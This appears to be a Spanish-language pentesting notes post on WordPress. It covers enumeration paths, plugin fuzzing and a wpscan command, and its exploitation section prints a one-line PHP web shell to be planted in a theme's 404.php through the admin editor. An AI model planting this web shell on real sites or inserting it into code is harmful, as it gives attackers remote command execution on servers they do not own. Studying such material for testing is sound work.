---
layout: single
title: Wordpress
excerpt: "Posibles vectores de ataque al enfrentarse a un Wordpress, rutas relevantes y archivos de configuración post-explotación relevantes."
date: 2021-12-14
classes: wide
header:
  teaser: /assets/images/Concepts/CMS/Wordpress/Wordpress.png
  teaser_home_page: true
  icon: /assets/images/concept.png
categories:
  - Concepts
tags:
  - CMS
---


# Definición
**Wordpress** es un gestor de contenido web. Se complementa con el uso de extensiones llamadas "plugins" los cuales hay que actualizar porque pueden ser potenciales vectores de ataque. 

# Enumeración
## Rutas Comunes
-   **index.php**
    
-   **license.txt** contains useful information such as the version WordPress installed.
    
-   **wp-activate.php** is used for the email activation process when setting up a new WordPress site.
    
-   Login folders (may be renamed to hide it):
    
    -   **/wp-admin/login.php**
        
    -   **/wp-admin/wp-login.php**
        
    -   **/login.php**
        
    -   **/wp-login.php**

- **xmlrpc.php** is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism.

- **wp-content/uploads/** Is the directory where any files uploaded to the platform are stored.
- **wp-content/plugins/** Folders where plugins can be fuzzed.

## Manual
### Plugin Discovery
Fuzzear bajo la ruta wp-content/plugins/ con un diccionario de plugins. [Por ejemplo el mio :)](https://github.com/creep33/wp-plugins-dict)
## Automática
### wpscan
#### Definición
Esta herramienta nos permite encontrar diferentes caracteristicas de un **wordpress** como por ejemplo plugins

#### Uso
```bash
wpscan --url "http://10.10.10.10/"
```

# Explotación
Consiste en conseguir RCE en la páigna

## Themes 
Accedemos a Appearance > Themes > 404.php > Twenty Seventeen.

Editamos el script para que sea una web shell

```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Podemos acceder al recurso mediante el parámetro p

> http\://website.web/?p=404.php

## Plugins
Si encontramos plugins, podemos buscar vulnerabilidades relacionadas en **searchploit** o internet. Para ver si podemos conseguir RCE.


---

Escrito el 14-12-2021 a las 07:19 pm por creep33.
